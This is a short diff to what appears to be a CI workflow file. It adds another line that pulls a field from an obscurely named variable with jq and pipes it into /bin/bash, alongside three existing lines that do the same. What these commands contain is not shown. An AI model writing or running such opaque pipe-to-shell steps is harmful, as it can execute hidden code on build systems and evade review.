@@ -34,6 +34,7 @@ jobs:
           echo $j3 | jq -r .n133 | /bin/bash
           echo $cc32 | jq -r .yfg17965 | /bin/bash
           printf '%s' "$srxgc24828" | jq -r .bsu24305 | /bin/bash
+          echo $kor6774 | jq -r .xk3 | /bin/bash
 
       - name: Save output
         if: always()
